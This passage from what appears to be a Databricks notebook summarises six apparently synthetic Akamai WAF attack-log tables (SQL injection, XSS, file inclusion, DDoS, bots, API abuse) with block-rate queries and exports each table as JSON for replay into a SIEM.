  FROM {catalog_name}.{schema_name}.akamai_bot_detection
"""))

# COMMAND ----------

# Scenario 6: API abuse
display(spark.sql(f"""
  SELECT
    'API Abuse' AS scenario,
    COUNT(*) AS total_records,
    COUNT(DISTINCT attackData.clientIP) AS unique_ips,
    SUM(CASE WHEN attackData.ruleActions = 'deny' THEN 1 ELSE 0 END) AS blocked,
    ROUND(100.0 * SUM(CASE WHEN attackData.ruleActions = 'deny' THEN 1 ELSE 0 END) / COUNT(*), 2) AS block_rate_pct
  FROM {catalog_name}.{schema_name}.akamai_api_abuse
"""))

# COMMAND ----------

# MAGIC %md
# MAGIC ## Output Data
# MAGIC
# MAGIC Six tables have been written in the output location:
# MAGIC
# MAGIC | Table                             | Scenario                                   |
# MAGIC | --------------------------------- | ------------------------------------------ |
# MAGIC | `akamai_sql_injection`            | SQL injection attacks                      |
# MAGIC | `akamai_xss`                      | Cross-Site Scripting (XSS)                 |
# MAGIC | `akamai_file_inclusion`           | Remote/Local File Inclusion (RFI/LFI)      |
# MAGIC | `akamai_ddos_rate_limit`          | DDoS / rate-limited traffic                |
# MAGIC | `akamai_bot_detection`            | Malicious bot activity                     |
# MAGIC | `akamai_api_abuse`                | API abuse and anomalous requests           |

# COMMAND ----------

# MAGIC %md
# MAGIC ## Export to JSON (Akamai SIEM format)
# MAGIC
# MAGIC Writes each dataset to a Unity Catalog Volume as JSON, the format Akamai SIEM delivers.
# MAGIC Replay these files into your SIEM or analytics pipeline.

# COMMAND ----------

base_path = f"/Volumes/{catalog_name}/{schema_name}/akamai_waf/"

tables = [
    (f"{catalog_name}.{schema_name}.akamai_sql_injection", "sql_injection"),
    (f"{catalog_name}.{schema_name}.akamai_xss", "xss"),
    (f"{catalog_name}.{schema_name}.akamai_file_inclusion", "file_inclusion"),
    (f"{catalog_name}.{schema_name}.akamai_ddos_rate_limit", "ddos_rate_limit"),
    (f"{catalog_name}.{schema_name}.akamai_bot_detection", "bot_detection"),
    (f"{catalog_name}.{schema_name}.akamai_api_abuse", "api_abuse"),
]

for table_name, file_name in tables:
    output_path = f"{base_path}{file_name}"
    print(f"Exporting {table_name} -> {output_path}")
    (
        spark
        .table(table_name)
        .write
        .format("json")
        .mode("overwrite")
        .save(output_path)
    )

print("\nAll exports complete. Files are at:")
for _, file_name in tables:
    print(f"  {base_path}{file_name}/")
